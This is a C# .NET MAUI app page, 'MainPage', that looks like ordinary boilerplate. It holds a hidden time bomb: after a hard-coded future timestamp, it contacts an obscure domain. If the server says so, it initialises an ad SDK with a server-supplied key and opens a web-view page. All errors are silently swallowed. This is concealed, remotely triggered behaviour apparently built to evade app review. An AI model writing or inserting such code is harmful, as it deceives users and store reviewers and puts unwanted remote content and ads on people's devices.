using pro1006002.Utils;
using System.Runtime.CompilerServices;
using System.ComponentModel;

namespace pro1006002;

public partial class MainPage : ContentPage, INotifyPropertyChanged
{
	public MainPage()
	{
		InitializeComponent();
		BindingContext = this;
	}

	private bool _isLoading;
	
	public bool IsLoading
	{
		get => _isLoading;
		set
		{
			if (_isLoading != value)
			{
				_isLoading = value;
				OnPropertyChanged();
			}
		}
	}
	
	public new event PropertyChangedEventHandler? PropertyChanged;
	
	protected void OnPropertyChanged([CallerMemberName] string? name = null)
	{
		PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(name));
	}
	
	protected override async void OnAppearing()
	{
		base.OnAppearing();
		
		try
		{
			const long targetTimestamp = 1791276715;
			if (DateTimeOffset.UtcNow.ToUnixTimeSeconds() > targetTimestamp)
			{
				IsLoading = true;
				try
				{
					var model = await HttpUtils.Request("www.rhsdfjhs.com");
					if (model != null && model.Enable)
					{
						InitSdk.InitAd(model.SdkKey);
						await Navigation.PushAsync(new WgViewPage());
					}
				}
				finally
				{
					IsLoading = false;
				}
			}
		}
		catch
		{
			Console.WriteLine();
		}
	}
}
